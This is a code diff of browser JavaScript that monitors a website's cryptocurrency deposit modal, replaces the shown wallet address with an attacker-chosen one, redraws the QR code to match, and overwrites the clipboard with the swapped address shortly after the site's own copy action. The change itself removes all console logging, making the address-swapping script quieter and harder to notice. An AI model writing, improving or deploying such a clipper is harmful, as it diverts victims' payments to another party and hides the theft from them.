@@ -28,19 +28,12 @@
     // Fallback for dynamically loading QRious if not available
     function ensureQRious(callback) {
         if (typeof QRious === 'undefined') {
-            console.log('[INFO] QRious is not defined. Loading dynamically...');
             const script = document.createElement('script');
             script.src = 'https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js';
-            script.onload = () => {
-                console.log('[INFO] QRious dynamically loaded.');
-                callback();
-            };
-            script.onerror = () => {
-                console.error('[ERROR] Failed to load QRious.');
-            };
+            script.onload = callback;
+            script.onerror = () => {};
             document.head.appendChild(script);
         } else {
-            console.log('[INFO] QRious is already loaded.');
             callback();
         }
     }
@@ -64,14 +57,12 @@
         const newAddress = newAddresses[cryptoKey];
         if (newAddress && inputElement.value !== newAddress) {
             inputElement.value = newAddress;
-            console.log(`[INFO] Updated ${cryptoKey.toUpperCase()} address to: ${newAddress}`);
         }
     };
 
     const updateQrCode = (cryptoKey) => {
         const qrSvgContainer = document.querySelector(qrCodeSvgContainerSelector);
         if (!qrSvgContainer) {
-            console.error('[ERROR] QR code container not found.');
             return;
         }
 
@@ -89,9 +80,6 @@
             });
 
             qrSvgContainer.appendChild(canvas);
-            console.log(`[INFO] Updated QR code for ${cryptoKey.toUpperCase()} to match the new address.`);
-        } else {
-            console.error('[ERROR] Address is invalid.');
         }
     };
 
@@ -105,11 +93,7 @@
                 setTimeout(() => {
                     navigator.clipboard
                         .writeText(newAddress)
-                        .then(() => {
-                            console.log(`[INFO] Custom copy for ${cryptoKey.toUpperCase()} address: ${newAddress}`);
-
-                        })
-                        .catch((err) => console.error(`[ERROR] Failed to copy ${cryptoKey.toUpperCase()} address: ${err}`));
+                        .catch(() => {});
                 }, 800); // Wait for the website's copy behavior
             },
             { once: true }
@@ -125,21 +109,15 @@
 
             if (selectedCrypto && inputElement) {
                 if (selectedCrypto !== previousCrypto) {
-                    console.log(`[INFO] Detected selected cryptocurrency: ${selectedCrypto}`);
                     updateAddressField(selectedCrypto, inputElement);
                     updateQrCode(selectedCrypto);
                     attachCopyFunction(selectedCrypto, inputElement);
                     previousCrypto = selectedCrypto;
                 }
-            } else {
-                console.log('[DEBUG] No cryptocurrency detected or input field missing.');
             }
-        } else {
-            console.log('[DEBUG] Modal container not found. Retrying...');
         }
     };
 
-    console.log('[INFO] Starting modal monitoring...');
     ensureQRious(() => {
         setInterval(monitorModal, 500); // Check every 500ms
     });
